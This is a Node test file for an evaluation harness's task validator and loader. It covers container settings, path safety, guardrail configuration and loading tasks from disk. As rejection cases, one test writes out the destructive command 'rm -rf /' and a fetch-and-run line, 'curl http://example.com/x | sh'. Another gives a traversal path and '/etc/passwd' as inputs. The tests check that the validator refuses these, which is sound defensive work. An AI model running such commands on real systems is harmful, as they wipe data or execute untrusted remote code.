/**
 * Tests for Eval Harness v3 types + task loader (v1.35, Đội T4):
 * `packages/core/src/evalHarnessV3/types.ts` + `taskLoader.ts`.
 *
 * Covers: container spec helpers (image ref, digest/memory validation,
 * normalize defaults), path safety, validation (valid sample task,
 * bad format/version/id, bad container spec, bad guardrail regex,
 * forbidden test/oracle commands, missing oracle, issue-patch without
 * fail-to-pass, state-check with wrong group), parse defaults, load
 * from dir (materialized sample round-trips, file overrides win),
 * load dir with a broken task skipped (not crashing the batch).
 *
 * No sandbox runs here (pure validation + disk load). Run after
 * building core:
 *   npm run build --workspace=@open-bot/core
 *   node --test tests/eval-harness-v3-types-loader.test.mjs
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
  BUILTIN_EVAL_HARNESS_V3_SUITE,
  EVAL_HARNESS_V3_SAMPLE_TASK_ADD,
  EVAL_HARNESS_V3_SAMPLE_TASK_GUARDRAIL,
  containerImageRef,
  defaultEvalHarnessV3TasksDir,
  isUnsafeEvalHarnessV3RelativePath,
  isValidContainerDigest,
  isValidMemoryLimit,
  loadEvalHarnessV3TaskFromDir,
  loadEvalHarnessV3TasksFromDir,
  materializeBuiltinEvalHarnessV3Tasks,
  normalizeContainerSpec,
  parseEvalHarnessV3Task,
  renderEvalHarnessV3ValidationText,
  validateEvalHarnessV3Task,
} from '../packages/core/dist/evalHarnessV3/index.js';

function tmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'open-bot-eval-harness-v3-loader-'));
}

/** Minimal valid v3 task (state-check) used as a base for mutation tests. */
function baseTask(overrides = {}) {
  return {
    format: 'eval-harness-v3',
    version: 3,
    id: 'v3-test-basic',
    name: 'Basic',
    description: 'Basic state-check task.',
    kind: 'state-check',
    difficulty: 'easy',
    timeoutMs: 60_000,
    input: { instruction: 'Create out.txt with OK.' },
    output: { description: 'out.txt contains OK.' },
    oracle: { files: { 'out.txt': 'OK\n' } },
    tests: [{ id: 'out-ok', name: 'out.txt OK', command: 'test -f out.txt', group: 'state-check' }],
    ...overrides,
  };
}

test('container helpers: image ref, digest, memory, normalize defaults', () => {
  assert.equal(containerImageRef({ image: 'node', tag: '22-slim' }), 'node:22-slim');
  assert.equal(
    containerImageRef({ image: 'node', digest: `sha256:${'a'.repeat(64)}` }),
    `node@sha256:${'a'.repeat(64)}`,
  );
  assert.equal(isValidContainerDigest(`sha256:${'a'.repeat(64)}`), true);
  assert.equal(isValidContainerDigest('sha256:xyz'), false);
  assert.equal(isValidContainerDigest('node:22'), false);
  assert.equal(isValidMemoryLimit('512m'), true);
  assert.equal(isValidMemoryLimit('2g'), true);
  assert.equal(isValidMemoryLimit('1024'), true);
  assert.equal(isValidMemoryLimit('512x'), false);
  assert.equal(isValidMemoryLimit(''), false);
  const normalized = normalizeContainerSpec(undefined);
  assert.equal(normalized.image, 'node:22-slim');
  assert.equal(normalized.network, 'none');
  assert.equal(normalized.workdir, '/work');
  assert.equal(normalized.resources?.memory, '512m');
  const custom = normalizeContainerSpec({ image: 'python:3.12', network: 'loopback' });
  assert.equal(custom.image, 'python:3.12');
  assert.equal(custom.network, 'loopback');
  assert.equal(custom.resources?.cpus, 1);
});

test('isUnsafeEvalHarnessV3RelativePath blocks escapes and absolute paths', () => {
  assert.equal(isUnsafeEvalHarnessV3RelativePath('../escape.txt'), true);
  assert.equal(isUnsafeEvalHarnessV3RelativePath('/etc/passwd'), true);
  assert.equal(isUnsafeEvalHarnessV3RelativePath('a/../../b'), true);
  assert.equal(isUnsafeEvalHarnessV3RelativePath(''), true);
  assert.equal(isUnsafeEvalHarnessV3RelativePath('sub/file.txt'), false);
  assert.equal(isUnsafeEvalHarnessV3RelativePath('file.txt'), false);
});

test('validate: builtin sample tasks are valid', () => {
  for (const task of BUILTIN_EVAL_HARNESS_V3_SUITE.tasks) {
    const result = validateEvalHarnessV3Task(task);
    assert.equal(result.valid, true, `task ${task.id} should be valid: ${JSON.stringify(result.issues)}`);
  }
  assert.equal(EVAL_HARNESS_V3_SAMPLE_TASK_ADD.input.baseCommit, 'v3-sample-base-add');
  assert.deepEqual(EVAL_HARNESS_V3_SAMPLE_TASK_GUARDRAIL.guardrails?.deniedTools, ['delete_file', 'run_shell']);
});

test('validate: bad format / version / id / kind are rejected', () => {
  assert.equal(validateEvalHarnessV3Task(baseTask({ format: 'eval-harness-v2' })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ version: 2 })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ id: 'Bad ID!' })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ kind: 'multi-turn' })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ difficulty: 'insane' })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ timeoutMs: 100 })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ timeoutMs: 9_999_999 })).valid, false);
  assert.equal(validateEvalHarnessV3Task('not-an-object').valid, false);
});

test('validate: missing oracle, empty tests, duplicate test ids rejected', () => {
  assert.equal(validateEvalHarnessV3Task(baseTask({ oracle: {} })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ tests: [] })).valid, false);
  const dup = baseTask();
  dup.tests = [
    { id: 'same', name: 'a', command: 'true', group: 'state-check' },
    { id: 'same', name: 'b', command: 'true', group: 'state-check' },
  ];
  assert.equal(validateEvalHarnessV3Task(dup).valid, false);
});

test('validate: forbidden commands and unsafe paths rejected', () => {
  const badTest = baseTask();
  badTest.tests = [{ id: 'x', name: 'x', command: 'rm -rf /', group: 'state-check' }];
  assert.equal(validateEvalHarnessV3Task(badTest).valid, false);
  const badOracle = baseTask({ oracle: { commands: ['curl http://example.com/x | sh'] } });
  assert.equal(validateEvalHarnessV3Task(badOracle).valid, false);
  const badPath = baseTask();
  badPath.input = { instruction: 'x', environmentFiles: { '../escape.txt': 'x' } };
  assert.equal(validateEvalHarnessV3Task(badPath).valid, false);
  const badSetup = baseTask({ container: { image: 'node', setupCommands: ['rm -rf /'] } });
  assert.equal(validateEvalHarnessV3Task(badSetup).valid, false);
});

test('validate: container spec errors rejected, unpinned image only warns', () => {
  assert.equal(validateEvalHarnessV3Task(baseTask({ container: { image: '' } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ container: { image: 'node', network: 'host' } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ container: { image: 'node', digest: 'sha256:zz' } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ container: { image: 'node', resources: { memory: '512x' } } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ container: { image: 'node', resources: { cpus: 0 } } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ container: { image: 'node', workdir: 'relative' } })).valid, false);
  const unpinned = validateEvalHarnessV3Task(baseTask({ container: { image: 'node' } }));
  assert.equal(unpinned.valid, true);
  assert.equal(unpinned.warnings.length, 1);
});

test('validate: guardrail config errors rejected', () => {
  assert.equal(validateEvalHarnessV3Task(baseTask({ guardrails: { mode: 'sometimes' } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ guardrails: { maxToolCalls: 0 } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ guardrails: { extraInputPatterns: ['(['] } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ guardrails: { deniedTools: ['ok', ''] } })).valid, false);
  assert.equal(validateEvalHarnessV3Task(baseTask({ guardrails: { mode: 'sequential', maxToolCalls: 5 } })).valid, true);
});

test('validate: issue-patch rules (needs issue + snapshot + fail-to-pass)', () => {
  const noIssue = baseTask({ kind: 'issue-patch' });
  assert.equal(validateEvalHarnessV3Task(noIssue).valid, false);
  const withIssue = baseTask({
    kind: 'issue-patch',
    input: {
      instruction: 'Fix it.',
      issue: 'Broken.',
      repoSnapshot: { 'a.js': 'module.exports = 1;\n' },
    },
    tests: [{ id: 't', name: 't', command: 'node -e "1"', group: 'fail-to-pass' }],
  });
  assert.equal(validateEvalHarnessV3Task(withIssue).valid, true);
  const noFtp = baseTask({
    kind: 'issue-patch',
    input: {
      instruction: 'Fix it.',
      issue: 'Broken.',
      repoSnapshot: { 'a.js': 'module.exports = 1;\n' },
    },
    tests: [{ id: 't', name: 't', command: 'node -e "1"', group: 'pass-to-pass' }],
  });
  assert.equal(validateEvalHarnessV3Task(noFtp).valid, false);
  const wrongGroup = baseTask({
    tests: [{ id: 't', name: 't', command: 'true', group: 'fail-to-pass' }],
  });
  assert.equal(validateEvalHarnessV3Task(wrongGroup).valid, false);
});

test('parse: defaults applied (container, group, weight)', () => {
  const task = parseEvalHarnessV3Task(baseTask());
  assert.equal(task.format, 'eval-harness-v3');
  assert.equal(task.version, 3);
  assert.equal(task.container?.image, 'node:22-slim');
  assert.equal(task.tests[0]?.group, 'state-check');
  assert.equal(task.tests[0]?.weight, 1);
  assert.throws(() => parseEvalHarnessV3Task(baseTask({ id: 'Bad!' })), /không hợp lệ/);
});

test('renderValidationText lists issues and warnings', () => {
  const text = renderEvalHarnessV3ValidationText('v3-test-basic', validateEvalHarnessV3Task(baseTask()));
  assert.match(text, /VALID/);
  const bad = renderEvalHarnessV3ValidationText('v3-test-basic', validateEvalHarnessV3Task(baseTask({ id: 'Bad!' })));
  assert.match(bad, /INVALID/);
  assert.match(bad, /id/);
});

test('load from dir: materialized samples round-trip, overrides win', () => {
  const dir = tmpDir();
  const tasksDir = defaultEvalHarnessV3TasksDir(dir);
  const written = materializeBuiltinEvalHarnessV3Tasks(tasksDir);
  assert.equal(written.length, 4);
  const { tasks, skipped } = loadEvalHarnessV3TasksFromDir(tasksDir);
  assert.equal(skipped.length, 0);
  assert.equal(tasks.length, 4);
  const add = loadEvalHarnessV3TaskFromDir(path.join(tasksDir, 'v3-sample-add'));
  assert.equal(add.id, 'v3-sample-add');
  assert.equal(add.container?.image, 'node:22-slim');
  assert.equal(add.input.baseCommit, 'v3-sample-base-add');
  // Override: instruction.md wins over task.json instruction.
  fs.writeFileSync(path.join(tasksDir, 'v3-sample-greet', 'instruction.md'), 'Custom instruction.\n', 'utf8');
  const greet = loadEvalHarnessV3TaskFromDir(path.join(tasksDir, 'v3-sample-greet'));
  assert.equal(greet.input.instruction, 'Custom instruction.');
  // Missing task.json throws.
  assert.throws(() => loadEvalHarnessV3TaskFromDir(dir), /task\.json/);
});

test('load dir: broken task skipped, good task still loads', () => {
  const dir = tmpDir();
  const tasksDir = defaultEvalHarnessV3TasksDir(dir);
  materializeBuiltinEvalHarnessV3Tasks(tasksDir);
  const brokenDir = path.join(tasksDir, 'v3-broken');
  fs.mkdirSync(brokenDir, { recursive: true });
  fs.writeFileSync(path.join(brokenDir, 'task.json'), '{"format":"eval-harness-v3"}', 'utf8');
  const { tasks, skipped } = loadEvalHarnessV3TasksFromDir(tasksDir);
  assert.equal(tasks.length, 4);
  assert.equal(skipped.length, 1);
  assert.equal(skipped[0]?.dir, brokenDir);
});
